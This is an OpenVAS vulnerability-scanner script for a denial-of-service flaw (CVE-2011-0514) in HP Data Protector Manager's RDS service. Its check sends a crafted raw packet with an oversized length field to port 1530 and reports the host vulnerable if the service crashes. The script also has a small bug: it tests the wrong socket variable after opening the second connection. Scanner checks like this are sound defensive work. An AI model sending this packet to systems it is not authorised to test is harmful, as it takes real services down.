###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_data_protector_manager_rds_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# HP Data Protector Manager RDS Service Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  condition.
  Impact Level: Application.";
tag_affected = "HP Data Protector Manager 6.11, Other versions may also be affected.";
tag_insight = "The flaw is caused by an error in the RDS service (rds.exe) when processing
  malformed packets sent to port 1530/TCP, which could be exploited by remote
  attackers to crash an affected server.";
tag_solution = "No solution or patch is available as of 21st June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";
tag_summary = "This host is installed with HP Data Protector Manager and is prone
  to denial of service vulnerability.";

if(description)
{
  script_id(900291);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_cve_id("CVE-2011-0514");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("HP Data Protector Manager RDS Service Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for the version of HP Data Protector Manager");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_keys("Services/data_protector/version");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/70617");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64549");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15940/");
  exit(0);
}

##
## The script code starts here
##

## HP Data Protector default port
port = 5555;

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Recieve header
res = recv(socket:soc, length:4096, timeout:20);

## Confirm the application before trying exploit
if("HP Data Protector" >!< res){
  exit(0);
}

## Close Socket
close(soc);

## HP Data Protector Manager default port
hpMgrPort = 1530;

## Check the port status
if(!get_port_state(hpMgrPort)){
  exit(0);
}

##  Open tcp socket
soc1 = open_sock_tcp(hpMgrPort);
if(!soc){
  exit(0);
}

## Crafted packet with big data packet size
req = raw_string(
                  0x23, 0x8c, 0x29, 0xb6, ## header (always the same)
                  0x64, 0x00, 0x00, 0x00, ## data packet size (too big)
                  0x41, 0x41, 0x41, 0x41  ## data
                );

## send the data
send(socket:soc1, data:req);

## wait for 2 sec
sleep(2);

## Close socket
close(soc1);


## Confirm HP Data Protector Manager alive or dead
soc2 = open_sock_tcp(hpMgrPort);
if(!soc2)
{
  security_warning(port);
  exit(0);
}
close(soc2);
